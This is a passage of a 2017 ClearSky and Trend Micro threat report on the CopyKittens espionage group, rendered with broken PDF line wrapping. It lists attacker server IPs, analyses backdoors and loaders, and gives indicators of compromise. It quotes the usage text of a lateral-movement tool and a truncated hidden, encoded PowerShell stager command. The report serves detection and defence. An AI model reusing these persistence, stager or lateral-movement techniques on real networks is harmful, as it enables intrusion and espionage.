\nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.198\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.205\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutio\nns L.L.C.\n \nAS46562\n \n104.200.128.206\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.208\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.209\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions \nL.L.C.\n \nAS46562\n \n104.200.128.48\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.58\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.64\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n104.200.128.71\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.160.138\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.160.178\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.160.194\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.160.195\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.161.141\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.174.21\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.174.228\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.174.232\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n107.181.174.241\n \nCobalt Strike\n \nUnited States\n \nTotal Server Solutions L.L.C.\n \nAS46562\n \n86.105.18.5\n \nCobalt Strike\n \nNetherlands\n \nWorldStream B.V.\n \nAS49981\n \n93.190.138.137\n \nNA\n \nNetherlands\n \nWorldStream B.V.\n \nAS49981\n \n212.199.61.51\n \nCobalt Strike\n \nIsrael\n \n012 Smile \nCommunications LTD.\n \nAS9116\n \n80.179.42.37\n \nNA\n \nIsrael\n \n012 Smile Communications LTD.\n \nAS9116\n \n80.179.42.44\n \nNA\n \nIsrael\n \n012 Smile Communications LTD.\n \nAS9116\n \n  \nPage \n26\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nRecently the attacker\ns\n \nimplemented self\n-\nsigned certificate\ns\n \nin some of the severs \nthey\n \nman\na\nge\n, \nimpersonating \nMicrosoft and Google\n.\n37\n \nSelf\n-\nsigned digital certificate impersonating Microsoft \nas captured by censys.io\n \n \n \n \n \n \n                                        \n                  \n \n37\n \nhttps://censys.io/certificates/f4aaac7d6aafc426d1adbe3b845a26c4110f7c9e54145444a8668718b84cbdb0\n\n \n  \nPage \n27\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nMalware\n \nIn this chapter we \nanalyze\n \nand review malware used by \nCopyKittens\n.\n \nTDTESS\n \nB\nackdoor\n \nTDTESS\n \n(22fd59c534b9b8f5cd69e967cc51de098627b582) \nis \n64\n-\nbit .NET binary \nbackdoor that provides a \nreverse shell with \nan \noption to download and execute files\n.\n \nIt \nroutinely calls in to the \ncommand and control \nserver for new instructions using basic \nauthentication\n. \nCommands\n \nare\n \nsent \nvia \na \nweb page.\n \nThe \nmalware \ncreate\ns a stealth service, which will\n \nnot show on the service manage\nr or other tools that enumerate\n \nservices \nfrom WINAPI or Windows Management Instrumentation\n.\n \n \nInstallation and removal\n \nTDTESS \ncan run \nas either\n \nan \ninteractive \nor \nnon\n-\ninteractive (service) program. When called interactively, it \nreceives one of the two arguments:\n \ninstalltheservice\n \nto install itself or \nuninstalltheservice\n \nto remove itself.\n \nThe \narguments\n \nare \ndescribed below\n:\n \ninstalltheservice\n \n \nIf \nrunning with administrator privileges, it will install a service with the following characteristics:\n \nKey name:\n \nbmwappushservice\n \nDisplay name:\n \nbmwappushsvc\n \nDescription:\n \nWAP Push Message Routing Service\n \nType:\n \nown (runs in its own process)\n \nStart type:\n \nauto (s\ntarts each time the computer is restarted and runs even if no one logs on to the \ncomputer)\n \nPath:\n \n<main executable path> (\nIn our analysis: \nc:\n\\\nUsers\n\\\nPC008\n\\\nDesktop\n\\\nt.exe)\n \nSecurity descriptor:\n \nD:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;C\nCLCSWLOCRRC;;;IU)(A;;CCLC\nSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;F\nA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\n \n \nService information from command\n-\nline using sc tool\n \nThe hardcoded security descriptor used to create the serv\nice is a persistence technique. Interactive users, even \nif they are administrators, cannot stop or even see the service in services.msc snap\n-\nin. \n \n \n \n  \nPage \n28\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nFollowing is a list of denied commands:\n \nservice_change_config\n \nservice_query_status\n \nservice_stop\n \nservice_pause_continue\n \ndelete\n \n \nService information in Registry\n \nTwo log files are created during the service installation, but deleted by the program. Following is\n \ntheir \nrecovered content:\n \nInstallUtil.InstallLog\n \n \n<filename>.t.InstallLog\n \nAfter\n \ncreating\n \nth\ne \nservice,\n \nit will \nupdate the file creation time to \nthat of the following file:\n \n%windir%\n\\\nsystem32\n\\\nsvchost.exe\n \n \n \n  \nPage \n29\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nuninstalltheservice\n \nIf running with administrator privileges, it \nwill uninstall the said service, \ncreate log files\n \nand then deletes them\n.\n \nInstallUtil.InstallLog\n \n \n<filename>.t.InstallLog\n \nBecause the \nservice installing mechanism appears to \nbe default for .NET programs, \nthe creator of the tool \ndeletes the log files right after they are created.\n \nIf no argument is given when called \ninteractively, the program terminates itself.\n \nFunctionality\n \nT\nhe service is started immediately\n \na\nfter installation\n.\n \nAfter \nfive\n \nminutes,\n \ni\nt \nverifies\n \ni\nnternet connectivity \nby \nmaking\n \na HTTP HEAD request to microsoft.com.\n \nThen it tries to access the C&C servers\n \nlooking for commands.\n \n \nHardcoded HTTP parameters and URL\n \n \n \n  \nPage \n30\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nAs a reply, TDTESS expects one of the following Bas64 encoded commands:\n \ngetnrun\n \n-\n \ndownload and execute \na file\n. Parameters are drop, drop_path and t.\n \nrunnreport\n \n-\n \nsend information about the \ncomputer\n.\n \nP\narameters are cmd and boss.\n \nwait\n \n-\n \ntime to next interval to get data\n.\n \n \nGetnrun command and parameters\n \nIndicators of \nC\nompromise\n \nFile name:\n \ntd\ntess.exe\n \n \nmd5:\n \n113ca319e85778b62145019359380a08\n \nServices:\n \nbmwappushservice\n \nRegistry Keys:\n \n \n \nHKLM\n\\\nSystem\n\\\nCurrentControlSet\n\\\nServices\n\\\nbmwappushservice\n \nURLs\n:\n \nhttp://is\n-\ncdn.edge.g18.dyn.usr\n-\ne12\n-\nas.akamaitechnology\n[\n.\n]\ncom/deploy/assets/css/main/style.min.css\n \nhttp://a17\n-\nh16.g11.iad17.as.pht\n-\nexternal.c15.qoldenlines\n[\n.\n]\nnet/deploy/assets/css/main/style.min.css\n \nHTTP art\nifacts:\n \n\"User\n-\nAgent : XXXXXXXXXXXXXXXXX/5.0 (Windows NT 6.1 WOW64; Trident/7.0; AS; rv:11.0) like Gecko\"\n \n\"Proxy\n-\nAuthorization : Basic [Data]\" \n\n \n[Data]\n \nWill contain the\n \nTDTESS\n \nencrypted data to send\n \n \n \n  \nPage \n31\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nVminst for Lateral Movement\n \nVminst \n(\na60a32f21ac1a2ec33135a650aa8dc71\n)\n \nis a\n \nl\nateral movement tool\n \nused to infect hosts in the network \nusing previously stolen credentials. \nIt \nInjects Cobalt Strike into \nmemory of \ninfected hosts. \n \nThe binary implements ServiceMain and \nis \nintended to be installed\n \n\nsdrsrv\n.\n\nfunctions as a service, it injects Cobalt Strike beacon into its own process (which is 32\n-\n\na \nnew 32\n-\n\nnds \non the \nparameter received when the service \nwas\n \ncreated.\n \nIt\n \nis\n \nconfigured to open\n \na\n \n\n-\nmode and create\n \na\n \nremote thread which executes \na Cobalt Strike beacon or shellcode.\n \nThe binary has the option to run and load itself in\n \nmemory.\n \nIt \nalso has the option to be executed through its \nexported function\n \n\"\nv\n,\n\" \nwhich \ngets \na \nbase64 string \nparameter \nbuilt as follow\ns\n:\n \nBase\n-\n64\n-\n\n \nOptionalCommand\n \ncan be one of the following:\n \n\n \nhelp\n \n-\n \nprints\n \nusage instructions\n:\n \n[*] /help V160\n\\\nn\n \nGet : Create Service and run beacon over self thread\n\\\nn\n \n[*] /get ip (use current token)\n\\\nn\n \n[*] /get ip domain user pass\n\\\nn\n \n[*] /get ip user pass\n\\\nn\n \nNew : Create Service and run beacon over new rundll32.exe thread\n\\\nn\n \n[*] /new ip (use current tok\nen)\n\\\nn\n \n[*] /new ip domain user pass\n\\\nn\n \n[*] /new ip user pass\n\\\nn\n \n[*] /new ip user pass\n\\\nn\n \nDel : Delete service and related dlls from remote host\n \n[*] /del ip domain user pass\n\\\nn\n \n[*] /del ip user pass\n\\\nn\n \n[*] /del ip\n\\\nn\n \nRun : Run a new beacon !\n\\\nn\n \n[*] /run [no argumen\nts]\n \n\n \ndel\n \n-\n \n\n,\n\n \n\\\n\\\n \n[IP or computer name (Can be Localhost)]\n\\\nC$\n\\\nUsers\n\\\npublic\n\\\nvminst.tmp\n \n\\\n\\\n \n[IP or computer name (Can be Localhost)]\n\\\nC$\n\\\nWindows\n\\\nTemp\n\\\nvminst.tmp\n \n\\\n\\\n \n[IP or computer name (Can be\n \nLocalhost)]\n\\\nC$\n\\\nWindows\n\\\nvminst.tmp\n \n\n \nscan\n \n-\n \n\n \n\n \ninfo\n \n-\n \n\n \n\n \nrun\n \n-\n \ninjects\n \na\n \nbeacon into \na \n\n \n\n \nget\n \n-\n \ngets\n \nan\n \nIP\n \naddress, install\ns\n \nand start\ns\n \n\n\n \n\n \nnew\n \n-\n \ngets \nIP\n \naddress, delete\ns\n \nthe \nold vminst from install path, \nand \ninstall\ns\n \n\n \nremote hosts. Then\n,\n \nstart\ns\n \n\nruns the \nservice\n. This \ncommand \nis likely us\ned for \nupdati\nng the implant\n.\n \nThe attacker uses vminst.tmp \nto\n \nspread across the organization. Using the command \n\n/mv /get\n \nip\n-\n\n \nit enumerates the segments and tries to connect to the hosts through SMB \n\n\ncan access\n.\n \n  \nPage \n32\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIndicators of \nC\nompromise\n \nFile name:\n \nvminst.tmp\n \nmd5:\n \nA60A32F21AC1A2EC33135A650AA8DC71\n \nServices:\n \n \nsdrsrv\n \nRegistry Keys:\n \nHKLM\n\\\nSystem\n\\\nCurrentControlSet\n\\\nServices\n\\\nsdrsrv\n \nPath:\n \n\\\n\\\n \n[IP or computer name (Can be Localhost)]\n\\\nC$\n\\\nUsers\n\\\npublic\n\\\n[File]\n \n\\\n\\\n \n[IP or computer name (Can be Localhost)]\n\\\nC$\n\\\nWindows\n\\\nTemp\n\\\n[File]\n \n\\\n\\\n \n[IP or computer name (Can be Localhost)]\n\\\nC$\n\\\nWindows\n\\\n[File]\n \nFile\n, one of:\n \nvminst.tmp \n-\n \nThe malware\n \nl.tmp \n-\n \nLog file from last\n \nV\n \ncommand\n \nNetSrv\n \n\n \nCobalt Strike Loader\n \nNetSrv\n \n(efca6664ad6d29d2df5aaecf99024892)\n \nloads\n \nCobalt\n \nStrike beacons \nand\n \nshellcodes \nin infected \ncomputers.\n \nThe binary implements ServiceMain\n, \n\nnetsrv\n.\n\nWhen it functions \nas a service, it\n \ni\ns configured to open \na \n\n-\nmode and create \na \nremote thread \nthat\n \nexecutes a Cobalt Strike beacon or shellcode.\n \nThe binary also has the option to be executed with parameters \nthat\n \ndetermine wha\nt it will inject into the \n\n-\nline is as follow\ns\n:\n \nnetsrv.exe /managed /ModuleToInject\n \nThe\n \nModuleToInject\n \ncan be one of these options:\n \nsbdns\n \nslbdnsk1\n \nslbdnsn1\n \nslbsbmn1\n \nslbsmbk1\n \nE\nach of these options injects a Cobalt Strike beacon\n \n\n \nIndicators of Compromise\n \nFile names:\n \n \nnetsrv.exe\n \nnetsrva.exe\n \nnetsrvd.exe\n \nnetsrvs.exe\n \nServices:\n \nnetsrv\n \nnetsrvs\n \nnetsrvd\n \nRegistry Keys:\n \nHKLM\n\\\nSystem\n\\\nCurrentControlSet\n\\\nServices\n\\\nnetsrv\n \nHKLM\n\\\nSystem\n\\\nCurrentControlSet\n\\\nServices\n\\\nnetsrvs\n \n  \nPage \n33\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nHKLM\n\\\nSystem\n\\\nCurrentControlSet\n\\\nServices\n\\\nnetsrvd\n \nMatryoshka v1 \n\n \nRAT\n \nMatryoshka v1 is a\n \nRAT analyzed in the \n2015 report by \nClearSky\n \nand Minerva\n.\n38\n \nIt uses DNS for \nc\nommand and \nc\nontrol communication, and has \ncommon RAT capabilities such as ste\naling Outlook passwords, screen \ngrabbing, keylogging, collecting and uploading files, and giving the attacker Meterpreter shell access. \nWe have \nseen this version of \nMatreyoshka\n \nin the wild from \nJuly 2016 \nuntil \nJanuary 2017\n.\n \n \nT\nhe\n \nMatryoshka.Reflective_Loader\n \ninjects the\n \nmodule\n \nMatryoshka.Rat\n,\n \nwhich has the same persistence\n \nkeys \nand communication method described \nin the original report\n.\n \n \nIndicators of \nC\nompromise\n \nFile name\n \nMd5\n \nCommand and control\n \nKernel.dll\n \n94ba33696cd6ffd6335948a75\n2ec9c19\n \ncloudflare\n-\nstatics\n[\n.\n]\ncom\n \nwin.dll\n \nd9aa197ca2f01a66df248c7a8b582c40\n \ncloudflare\n-\nanalyse\n[\n.\n]\ncom\n \nupdate5x.dll \n \n22092014_ver621.dll\n \n506415ef517b4b1f7679b3664ad399e1\n \n1ca03f92f71d5ecb5dbf71b14d48495c\n \nmswordupdate17\n[\n.\n]\ncom\n \n \nRegistry Keys:\n \nHKCU\n\\\nSOFTWARE\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersion\n\\\nExplorer\n\\\nStartupApproved\n\\\nRun\n\\\n{0355F5D0\n-\n467C\n-\n30E9\n-\n894C\n-\nC2FAEF522A13}\n \nHKCU\n\\\nSoftware\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersion\n\\\nRun\n\\\n{0355F5D0\n-\n467C\n-\n30E9\n-\n894C\n-\nC2FAEF522A13}\n \nScheduled Tasks:\n \n\\\nWindows\n\\\nMicrosoft Boost Kernel \nOptimization\n \nWindows Boost Kernel\n \nMatreyoshka\n \nv2 \n\n \nRAT\n \nMatryoshka\n \nv\n2\n \n(\nbd38cab32b3b8b64e5d5d3df36f7c55a\n)\n \nis\n \nmostly \nlike\n \nMatreyoshka\n \nv1 but\n \nhas \nfewer\n \ncommands and a few other minor changes.\n \nUpon \nstart\ning\n \nit will inject \nthe communication module \nto\n \nall\n \navailable processes (with the same run architecture and the same or \nlower \nlevel of permission)\n.\n \n \nThe inner name of\n \n\n \nis\n \nInjector.dll\n. The next stage, in \nmemory\n, \nis\n \nReflectiveDLL.dll\n. \nThe\n \nReflectiveDLL.dll \nprovides \npersistence via \na \nschedule task an\nd checks that the stager, \nInjector.dll\n,\n \nexist on disk.\n \nReflectiveDLL.dll\n \nget\ns\n \ncommands via \nthe following DNS\n \nresolutions\n:\n \nFunctionality\n \nResolved\n \nIP\n \nCommand\n \nSend host information\n \n\n \nSend full info\n \nInject\n\nCobalt Strike\nbeacon\n \n\n \nBeacon\n \nPop MessageBox\nwith simple note\n \n(Only if injected into process with user \ninterface)\n \n\n \nMessageBox\n \nSend \nUID\n \n\n \nGet UID\n \nE\nxit the process the thread \nwas \ninject\ned\n \ninto\n \n\n \nExit\n \nkeep\n-\nalive or end chain of commands\n \n\n \nOK_StopParse\n \n \n \n \n                                        \n                  \n \n38\n\n \nwww.clearskysec.com/report\n-\nthe\n-\ncopykittens\n-\nare\n-\ntargeting\n-\nisraelis/\n \n \n  \nPage \n34\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIndicators of Compromise\n \nFile names:\n \nSvchost32.swp \n \nSvchost64.swp\n \nMd5:\n \nbd38cab32b3b8b64e5d5d3df36f7c55a\n \nF\nolder path\n:\n \n[windrive]\n\\\nUsers\n\\\npublic\n\\\n \n[windrive]\n\\\nWindows\n\\\ntemp\n\\\n \n[windrive]\n\\\nWindows\n\\\ntmp\n\\\n \nF\niles\n:\n \nLogManager.tmp\n \nedg1CF5.tmp\n \n \n(\nmalware backup copy\n)\n \nntuser.swp \n \n \n(\nmalware backup copy\n)\n \nsvchost64.swp\n \n(\nmalware main file)\n \nntuser.dat.swp \n(\nlog file\n)\n \n455aa96e\n-\n804g\n-\n4bcf\n-\nbcf8\n-\nf400b3a9cfe9.PackageExtraction \n(\nfolder\n)\n \n_%d.klg \n(keylog file, \nrandom int\neger\n)\n \n_%d.sc\n \n(\nscreen cap\nture file, \nrandom \nint\neger\n)\n \nCommand and control:\n \nwinupdate64\n[\n.\n]\ncom\n \nServices:\n \nsdrsrv\n \nClass from CPP RTTI\n:\n \nPSCL_CLASS_JOB_SAVE_CONFIG\n \nPSCL_CLASS_BASE_JOB\n \n \n \n  \nPage \n35\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nZPP \n\n \nFile Compressor\n \n \nZPP (\nbcae706c00e07936fc41ac47d671fc40\n) is a\n \n.NET console program that compresses files with the \nZIP \nalgorithm\n. \nIt can transfer compressed files to a remote network share.\n \nCommand line options are as follows:\n \n-\nI\n \n-\n \nFile extension to compress (i.e.: .txt)\n \n-\ns\n \n-\n \nSource directory\n \n-\nd\n \n-\n \nDestination directory\n \n-\ngt\n \n-\n \nGreater than creation timestamp\n \n-\nlt\n \n-\n \nLower \nthan creation timestamp\n \n-\nmb\n \n-\n \nUnimplemented\n \n-\no\n \n-\n \nOutput file name\n \n-\ne\n \n-\n \nFile extension to skip (except)\n \n \nZPP\n\n \nZPP will recursively read all files in the source directory to compress them with \nthe \nmaximum compression \nrate if their names match the extension pattern \ngiven \n(\n-\ni). The compressed ZIP file is writte\nn to the output \ndirectory (\n-\nd). \nIf no output file name is set, ZPP will use the mask \nzpp<random_number>.out. <file_number>\n. \n \nFor \nexample\n:\n \n \nFil\nename is zpp5077.out0 \n \nThe f\nile compilation \ntimestamp is Tue, 05 Jul 2016 17:22:59 UTC.\n \nad09feb76709b825569d9c263dfdaaac is a previous version (compilation timestamp: Sat, 09 Jan 2016 17:02:38 \nUTC) and \nis only different in that it \naccepts\n \nthe \n\ne switch\n, which \nignored by the program logic.\n \n214be584ff88fb9c44676c1d3afd7c95 is the newest version (compilation timestamp: Mon, 26 Sep 2016 \n19:49:34 UTC\n). \nIt\n \nis\n \nsupposed to implement \nthe \n\ns\n \nswitch\n \nbut although it is\n \nset when the user gives it to the \nprogram, \nthe\n \nswitch is\n \nignored by the code.\n \n \nZPP version 2.0\n \nZPP seems to be \nunder development. All versions have \nbugs.\n \nIt uses the reduced version of DotNetZip library\n.\n39\n \nTherefore, it requires \nIonic.Zip.Reduced.dll\n \n(\n7c359500407dd393a276010ab778d5af\n) to be under the \nsame directory or %PATH%.\n \nF\nunction \ndoCompressInNetWorkDirectory()\n \nis \nintended to exfiltrate date from a ta\nrget machine to a network \nshare.\n \n                                        \n                  \n \n39\n\nhttps://dotnetzip.codeplex.com\n \n  \nPage \n36\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nZPP\n\ndoCompressInNetWorkDirectory()\n\nfunction\n \nP\nassing \nit \na network location\n \nwill result in the compressed files \nbeing\n \ndropped\n \nin \nit\n:\n \n \nPassing a network location to ZPP\n \nIndicators of Compromise\n \nFile name:\n \nzpp\n.exe\n \n \nmd5:\n \nbcae706c00e07936fc41ac47d671fc40\n \nad09feb76709b825569d9c263dfdaaac\n \n214be584ff88fb9c44676c1d3afd7c95\n \nCobalt Strike\n \nCobalt Strike\n \nis a publicly available \ncommercial software for \"\nAdversary Simulations and Red Team \nOperations\n.\"\n40\n \nWhile not malicious in and of itself, it is often used by cybercrime groups and state\n-\nsponsored \nthreat groups, due to its \npost\n-\nexploitation\n \nand covert communication capabilities.\n \n41\n \n42\n43\n \n44\n \nCopyKittens use the free \n21\n-\nday\n \ntrial version\n \nof Cobalt Strike\n. \nThus\n, malicious communication generated by \nthe tool is much easier to \ndetect, because \na special header is sent\n \nin\n \ne\nach HTTP GET transaction\n. \nThe special \nheader is \n\"X\n-\nMalware\n,\n\"\n \ni.e. there is a literal indication that \"this network communication is malicious\n.\n\" All that \n                                        \n                  \n \n40\n\n \nhttps://www.cobaltstrike.com\n \n \n41\n\nhttps://www.fireeye.com/blog/threat\n-\nresearch/2017/05/cyber\n-\nespionage\n-\napt32.html\n \n \n42\n\nhttps://www.symantec.com/connect/blogs/odinaff\n-\nnew\n-\ntrojan\n-\nused\n-\nhigh\n-\nlevel\n-\nfinancial\n-\nattacks\n \n \n43\n\nhttps://www.cybereason.c\nom/labs\n-\noperation\n-\ncobalt\n-\nkitty\n-\na\n-\nlarge\n-\nscale\n-\napt\n-\nin\n-\nasia\n-\ncarried\n-\nout\n-\nby\n-\nthe\n-\noceanlotus\n-\ngroup/\n \n \n44\n\nhttp://www.antiy.net/wp\n-\ncon\ntent/uploads/ANALYSIS\n-\nON\n-\nAPT\n-\nTO\n-\nBE\n-\nATTACK\n-\nTHAT\n-\nFOCUSING\n-\nON\n-\nCHINAS\n-\nGOVERNMENT\n-\nAGENCY\n-\n.pdf\n \n \n  \nPage \n37\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \ndefender need to do\n \nto \ndetect\n \ninfections\n \nis\n \nto\n \nlook for this header in network traffic.\n \nOther \"\ntells\n\" are \nimplemented in the trail version\n.\n45\n \nCopy\nK\nittens often use \nCobalt Strike\n's DNS based command and control capability.\n46\n \nOther capabilities include \nPowerShell\n \nscripts\n \nexecution\n, keystrokes\n \nlogging\n, \ntaking \nscreenshots, f\nile\n \ndownload\ns\n, spawning other payloads, \nand \npeer\n-\nto\n-\npeer\n \ncommunication over the SMB.\n \nPersistency\n \nThe attacker\ns\n \nused a novel way for persistency of \nCobalt \nStrike samples in certain machine\n \n\n \na\n \nscheduled task \nwas written directly to the registry. \n \nThe malware creates a \nPowerShell\n \nwrapper, which executes powershell.exe to run scripts. The wrapper is \ncopi\ned to %windir% with one of the following names:\n \nsvchost.\nexe\n \ncsrss.exe\n \nnotpad.exe (note missing e)\n \nconhost.exe\n \nThe scheduled tasks are saved in the following registry path:\n \nHKEY_LOCAL_MACHINE\n\\\nSOFTWARE\n\\\nMicrosoft\n\\\nWindows NT\n\\\nCurrentVersion\n\\\nSchedule\n\\\nTaskCache\n\\\nTasks\n \nWith the following attributes:\n \n\"Path\"=\"\n\\\n\\\nMicrosoft\n\\\n\\\nWindows\n\\\n\\\nMedia Center\n\\\n\\\nConfigureLocalTimeService\"\n \n\"Description\"=\"Media Center Time Update From Computer Local Time.\"\n \n\"Actions\"=hex:01,00,66,66,00,00,00,00,2c,00,00,00,43,00,3a,00,5c,00,57,00,69,\n\\\n \n0\n0,6e,00,64,00,6f,00,77,00,73,00,5c,00,73,00,76,00,63,00,68,00,6f,00,73,00,\n\\\n \n74,00,2e,00,65,00,78,00,65,00,7e,31,00,00,2d,00,6e,00,6f,00,70,00,20,00,2d,\n\\\n \n00,77,00,20,00,68,00,69,00,64,00,64,00,65,00,6e,00,20,00,2d,00,65,00,6e,00,\n\\\n \n63,00,6f,00,64,00,65,00,64\n,00,63,00,6f,00,6d,00,6d,00,61,00,6e,00,64,00,20,\n\\\n \n00,4a,00,41,00,42,00,7a,00,41,00,44,00,30,00,41,00,54,00,67,00,42,00,6c,00,\n\\\n \n\n \nThe hex code in the \nActions\n \nattribute is converted into the following command line action:\n \nC:\n\\\nWindows\n\\\nsvchost.exe\n \n-\nnop\n \n-\nw hidden \n-\nencodedcommand JABzAD0ATgBl\n\n \nThe \nexecuted \ncommand is a base64 \nencoded\n \nPowerShell\n \ncobalt strike stager.\n \nThe task does not have a name attribute and it does not appear in windows scheduled task viewers. \nThe \ninstallation methods of this persiste\nncy method is unknown to us.\n \nMetasploit\n \nA well\n-\nknown free and open source framework\n \nfor developing and executing exploit code against a remote \ntarget machine\n.\n47\n \nIt \nhas more than \n1\n,\n61\n0 exploits, as well as \nmore than\n \n438 payloads\n, which include \nc\nommand \nshell \nthat \nenables users to run collection scripts or arbitrary commands against the host\n.\n \nMeterpreter\n, which\n \nenables users to control the screen of a device using VNC and to browse, upload and download files\n.\n \nIt also \nemploys d\nynamic payloads \nthat e\nnables users \nto evade antivirus defenses by generating unique payloads.\n48\n \n \n                                        \n                  \n \n45\n\nhttps://blog.cobaltstrike.com/2015/10/14/the\n-\ncobalt\n-\nstrike\n-\ntrials\n-\nevil\n-\nb\nit/\n \n \n46\n\nhttps://www.cobaltstrike.com/help\n-\ndns\n-\nbeacon\n \n \n47\n\nhttps://www.metasploit.com\n  \n \n48\n\nhttps://en.wikipedia.org/wiki/Metasploit_Project\n \n \n  \nPage \n38\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nEmpire\n \nP\nost\n-\nexploitation \nF\nramework\n \nIn several \noccasions\n \nthe attackers used \nEmpire\n, a free and open source \"\npost\n-\nexploitation framework that \nincludes a pure\n-\nPowerShell2.0 Windows agent, and a pure\n \nPython 2.6/2.7 Linux/OS X agent.\n49\n \nThe framework \noffers cryptologically\n-\nsecure communications and a flexible architecture. On the PowerShell side, Empire \nimplements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable pos\nt\n-\nexploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network \ndetection, all wrapped up in a usability\n-\nfocused framework.\n\"\n \n                                        \n                  \n \n49\n\nhttps://github.com/EmpireProject/Empire\n \n \n  \nPage \n39\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIndicators of \nC\nompromise\n \nDetection name\n \nBKDR_COBEACON.A\n \nDetection name\n \nTROJ_POWPICK.A\n \nDetection name\n \nHKTL_PASSDUMP\n \nDetection name\n \nTROJ_SODREVR.A\n \nDetection name\n \nTROJ_POWSHELL.C\n \nDetection name\n \nBKDR_CONBEA.A\n \nDetection name\n \nTSPY64_REKOTIB.A\n \nDetection name\n \nHKTL_DIRZIP\n \nDetection name\n \nTROJ_WAPPOME.A\n \nURL\n \nhttp://js[.]jguery[.]net/main[.]js\n \nURL\n \nhttp://pht[.]is[.]nlb\n-\ndeploy[.]edge\n-\ndyn[.]e11[.]f20[.]ads\n-\nyoutube[.]online/winini[.]exe\n \nURL\n \nhttp://38[.]130[.]75[.]20/check[.]html\n \nURL\n \nhttp://update[.]microsoft\n-\noffice[.]solutions/license[.]doc\n \nURL\n \nhttp://update[.]microsoft\n-\noffice[.]solutions/error[.]html\n \nURL\n \nhttp://main[.]windowskernel14[.]com/spl/update5x[.]zip\n \nURL\n \nhttp://img[.]twiter\n-\nstatics[.]info/i/658A6D6AE42A658A6D6AE42A/0de9c5c6599fdf5201599ff9b30e0000/6E24E58CF\nC94/icon[.]png\n \nURL\n \nhttp://files0[.]terendmicro[.]com/\n \nURL\n \nhttp://ssl[.]pmo[.]gov[.]il\n-\ndana\n-\nnaauthurl1\n-\nwelcome[.]cgi[.]primeminister\n-\ngoverment\n-\ntechcenter[.]tech/%D7%A1%D7%A7%D7%A8%20%D7%A9%D7%A0%D7%AA%D7%99[.]docx\n \nURL\n \nhttp://ea\n-\nin\n-\nf155[.]1e100[.]microsoft\n-\nsecurity[.]host/\n \nURL\n \nhttps://ea\n-\nin\n-\nf155[.]1e100[.]microso\nft\n-\nsecurity[.]host/mTQJ\n \nURL\n \nhttp://iba[.]stage[.]7338879[.]i[.]gtld\n-\nservers[.]services\n \nURL\n \nhttp://doa[.]stage[.]7338879[.]i[.]gtld\n-\nservers[.]services\n \nURL\n \nhttp://fda[.]stage[.]7338879[.]i[.]gtld\n-\nservers[.]services\n \nURL\n \nhttp://rqa[.]stage[.]7338879[.]i[.]gtld\n-\nservers[.]services\n \nURL\n \nhttp://qqa[.]stage[.]7338879[.]i[.]gtld\n-\nservers[.]services\n \nURL\n \nhttp://api[.]02ac36110[.]49318[.]a[.]gtld\n-\nservers[.]zone\n \nURL\n \ns1w\n-\namazonaws.office\n-\nmsupdate[.]solutions\n \nURL\n \na104\n-\n93\n-\n82\n-\n25.mandalasanati[.]info/iBpa\n \nURL\n \nhttp://fetchnews\n-\nagency[.]news\n-\nbbc.press/pictures.html\n \nURL\n \nhttp://fetchnews\n-\nagency.news\n-\nbbc.press/omnews.doc\n \nURL\n 